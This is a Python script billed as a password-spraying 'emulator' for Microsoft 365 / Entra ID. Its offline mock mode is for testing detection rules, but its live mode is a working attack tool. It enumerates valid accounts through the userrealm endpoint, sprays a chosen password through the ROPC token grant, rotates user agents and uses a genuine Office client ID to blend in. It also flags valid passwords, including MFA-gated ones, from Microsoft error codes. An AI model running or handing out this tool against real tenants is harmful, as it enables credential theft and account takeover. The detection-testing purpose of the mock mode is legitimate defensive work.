#!/usr/bin/env python3
"""
o365spray Emulator / Simulator.
Simulates or performs password spraying against Microsoft 365 / Entra ID.
Includes a `--mock` mode to safely test the Blue Team alert rules offline.
"""

from __future__ import annotations

import argparse
import json
import random
import sys
import time
from typing import Any

try:
    import requests
except ImportError:
    print("[Error] Install requests: pip install requests", file=sys.stderr)
    sys.exit(1)

# Reconfigure stdout/stderr to use UTF-8 to prevent encoding errors on Windows
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
]


def check_user_realm(username: str, session: requests.Session) -> dict[str, Any]:
    """Queries userrealm endpoint to determine if a username exists and its realm status."""
    url = f"https://login.microsoftonline.com/common/userrealm/{username}?api-version=2.1"
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    try:
        r = session.get(url, headers=headers, timeout=10)
        if r.status_code == 200:
            data = r.json()
            return {
                "username": username,
                "exists": data.get("NameSpaceType") != "Unknown",
                "type": data.get("NameSpaceType", "Unknown"),
                "domain": username.split("@")[-1] if "@" in username else "",
            }
    except requests.RequestException:
        pass
    return {"username": username, "exists": False, "type": "Unknown", "domain": ""}


def spray_oauth2_token(
    username: str, password: str, session: requests.Session
) -> dict[str, Any]:
    """Attempts OAuth2 token retrieval using Resource Owner Password Credentials (ROPC) grant."""
    url = "https://login.microsoftonline.com/common/oauth2/token"
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/x-www-form-urlencoded",
    }
    # Common client ID for Microsoft Office (to look realistic)
    client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    
    payload = {
        "resource": "https://graph.microsoft.com",
        "client_id": client_id,
        "grant_type": "password",
        "username": username,
        "password": password,
        "scope": "openid",
    }
    
    try:
        r = session.post(url, headers=headers, data=payload, timeout=10)
        # Parse result code
        data = r.json()
        error_code = data.get("error_codes", [0])[0]
        
        # Mapping common Microsoft error codes
        # 50126 = Invalid username or password
        # 50053 = Account is locked, IP address is blocked, or user is not allowed
        # 50057 = User account is disabled
        # 50076 / 50079 = MFA required (still counts as a valid password / success verification)
        if r.status_code == 200:
            return {"username": username, "status": "SUCCESS", "code": "0", "details": "Token acquired successfully"}
        
        if error_code == 50126:
            return {"username": username, "status": "FAILURE", "code": "50126", "details": "Invalid username or password"}
        if error_code == 50053:
            return {"username": username, "status": "FAILURE", "code": "50053", "details": "Account locked or IP blocked"}
        if error_code == 50057:
            return {"username": username, "status": "FAILURE", "code": "50057", "details": "User account disabled"}
        if error_code in (50076, 50079):
            return {"username": username, "status": "SUCCESS_MFA", "code": "50076", "details": "Valid password but MFA required"}
            
        return {"username": username, "status": "FAILURE", "code": str(error_code), "details": data.get("error_description", "Unknown error")}
    except Exception as exc:
        return {"username": username, "status": "ERROR", "code": "999", "details": str(exc)}


def load_userlist(path: str) -> list[str]:
    """Loads email addresses/usernames from a text file, filtering comments and empty lines."""
    try:
        with open(path, encoding="utf-8") as f:
            return [
                line.strip()
                for line in f
                if line.strip() and not line.strip().startswith("#")
            ]
    except Exception as exc:
        print(f"[Error] Failed to read user list: {exc}", file=sys.stderr)
        return []


def main() -> None:
    parser = argparse.ArgumentParser(description="M365 / Entra ID Password Spraying Emulator")
    parser.add_argument("--userlist", "-u", required=True, help="Path to username/email text file")
    parser.add_argument("--password", "-p", required=True, help="Password to spray against accounts")
    parser.add_argument("--delay", "-d", type=float, default=1.0, help="Delay between requests in seconds")
    parser.add_argument("--validate", action="store_true", help="Perform username validation (userrealm check) before spray")
    parser.add_argument("--mock", action="store_true", help="Run in mock mode (local simulation, no real API traffic)")
    parser.add_argument("--success-user", default=None, help="In mock mode, trigger a SUCCESS on this specific username")
    parser.add_argument("--output", "-o", help="Write results JSON report to file")
    args = parser.parse_args()

    users = load_userlist(args.userlist)
    if not users:
        print("[Error] No users loaded. Exiting.", file=sys.stderr)
        sys.exit(1)

    print(f"[*] Loaded {len(users)} users.")
    print(f"[*] Target Password: {args.password}")
    print(f"[*] Delay Jitter: {args.delay}s")
    print(f"[*] Execution Mode: {'MOCK (local simulation)' if args.mock else 'LIVE (Entra ID API)'}")
    print("-" * 50)

    session = requests.Session()
    results = []
    
    # 1. Validation phase
    if args.validate:
        print("[*] Validating usernames against userrealm API...")
        valid_users = []
        for user in users:
            if args.mock:
                # Mock validation
                exists = not user.startswith("invalid")
                res = {
                    "username": user,
                    "exists": exists,
                    "type": "Managed" if exists else "Unknown",
                    "domain": user.split("@")[-1] if "@" in user else "corp.lab"
                }
            else:
                res = check_user_realm(user, session)
                time.sleep(args.delay)

            status = "VALID" if res["exists"] else "INVALID"
            print(f"  [RealmCheck] {res['username']} -> {status} ({res['type']})")
            if res["exists"]:
                valid_users.append(user)
        
        print(f"[*] Completed realm check. Valid users: {len(valid_users)}/{len(users)}")
        users = valid_users
        print("-" * 50)

    # 2. Spraying phase
    print(f"[*] Commencing password spray with password '{args.password}'...")
    for user in users:
        if args.mock:
            # Mock spray execution
            # Success triggers if user matches success-user
            is_success = args.success_user and user.lower() == args.success_user.lower()
            if is_success:
                res = {
                    "username": user,
                    "status": "SUCCESS",
                    "code": "0",
                    "details": "Mock verification: Valid password"
                }
            else:
                res = {
                    "username": user,
                    "status": "FAILURE",
                    "code": "50126",
                    "details": "Mock verification: Invalid username or password"
                }
        else:
            res = spray_oauth2_token(user, args.password, session)
            time.sleep(args.delay)

        results.append(res)
        color = "\033[92m" if "SUCCESS" in res["status"] else "\033[91m"
        reset = "\033[0m"
        print(f"  {color}[{res['status']}] {res['username']} -> Code: {res['code']} ({res['details']}){reset}")

    # Summarize results
    successes = [r for r in results if "SUCCESS" in r["status"]]
    failures = [r for r in results if r["status"] == "FAILURE"]
    
    print("-" * 50)
    print(f"[*] Spray complete.")
    print(f"[*] Total Attempts: {len(results)}")
    print(f"[*] Successes:      {len(successes)}")
    print(f"[*] Failures:       {len(failures)}")

    if args.output:
        report = {
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "password_sprayed": args.password,
            "mode": "mock" if args.mock else "live",
            "summary": {
                "total": len(results),
                "success": len(successes),
                "failure": len(failures)
            },
            "results": results
        }
        with open(args.output, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2)
        print(f"[*] Saved report to {args.output}")


if __name__ == "__main__":
    main()
